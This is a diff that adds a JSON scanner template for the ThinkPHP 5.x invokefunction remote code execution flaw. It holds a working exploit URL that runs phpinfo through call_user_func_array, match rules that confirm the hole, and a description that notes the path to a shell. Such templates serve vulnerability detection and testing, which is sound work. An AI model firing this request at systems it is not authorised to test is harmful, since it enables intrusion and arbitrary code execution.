@@ -1,0 +1,38 @@
+{
+  "name": "web/ThinkPHP invokefunction controller RCE",
+  "description": "[critical] GOD TIER — ThinkPHP 5.x invokefunction RCE (CVE-2018-25270, ExploitDB 45978, actively exploited): the router accepts \\think\\app as a controller and invokefunction as an action, so call_user_func_array('phpinfo') renders the phpinfo page = arbitrary function call -> getshell. Keywords: thinkphp invokefunction rce call_user_func_array phpinfo cve-2018-25270 exploitdb 45978. ctrl: patched routing answers 404 -> not falsified. base_url = ThinkPHP app root.",
+  "cwe": "CWE-94",
+  "requests": {
+    "payload": {
+      "method": "GET",
+      "url": "{{base_url}}/index.php?s=/Index/%5Cthink%5Capp/invokefunction&function=call_user_func_array&vars[0]=phpinfo&vars[1][]=-1"
+    }
+  },
+  "conditions": [
+    {
+      "type": "status",
+      "request": "payload",
+      "equals": 200
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "PHP Version",
+      "present": true
+    },
+    {
+      "type": "body_regex",
+      "request": "payload",
+      "pattern": "Configuration File \\(php\\.ini\\) Path",
+      "present": true
+    }
+  ],
+  "params": [
+    "base_url"
+  ],
+  "source": "imported",
+  "successes": 1,
+  "id": "662a7d5bac20",
+  "created": "2026-11-05T19:30:06.502181+00:00",
+  "last_used": "2026-11-05T19:30:06.502181+00:00"
+}
